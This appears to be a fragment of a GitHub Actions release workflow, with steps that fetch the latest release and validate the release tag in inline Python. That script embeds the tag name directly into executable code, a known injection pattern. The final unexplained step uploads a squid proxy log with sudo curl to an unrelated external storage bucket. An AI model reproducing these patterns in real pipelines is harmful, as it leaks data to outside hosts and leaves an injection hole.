    - continue-on-error: true
      env:
        repository: ${{ github.repository }}
        token: ${{ secrets.GITHUB_TOKEN }}
        type: stable
      id: latest_release
      name: Get latest release
      uses: rez0n/actions-github-release@v2.0
    - continue-on-error: true
      id: get_settings
      name: Get settings for this release
      run: "import os\nimport re\nimport sys\n\nsemver_no_meta = '''^(?P<major>0|[1-9]\\\
        d*)\\.(?P<minor>0|[1-9]\\d*)\\.(?P<patch>0|[1-9]\\d*)(?:-(?P<prerelease>(?:0|[1-9]\\\
        d*|\\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\\.(?:0|[1-9]\\d*|\\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?$'''\n\
        tag_name = '${{ github.event.release.tag_name }}'\n\nis_valid_version = re.match(semver_no_meta,\
        \ tag_name) is not None\nif not is_valid_version:\n  print(f'Release version\
        \ {tag_name} is not a valid full or pre-release. See RELEASE.md for more information.')\n\
        \  sys.exit(1)\n\nis_prerelease = '-' in tag_name\n\n# Safeguard: you need\
        \ to both set \"latest\" in GH and not have suffixes to overwrite latest\n\
        is_latest = '${{ steps.latest_release.outputs.release }}' == tag_name and\
        \ not is_prerelease\n\nbucket_suffix = '-dev' if is_prerelease else ''\n\n\
        with open(os.environ['GITHUB_OUTPUT'], 'a') as ofp:\n  print(f'is_latest={is_latest}'.lower(),\
        \ file=ofp)\n  print(f'bucket_suffix={bucket_suffix}', file=ofp)\n"
      shell: python
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/HubSpot/falco.$(date
        +%s)
    timeout-minutes: 60
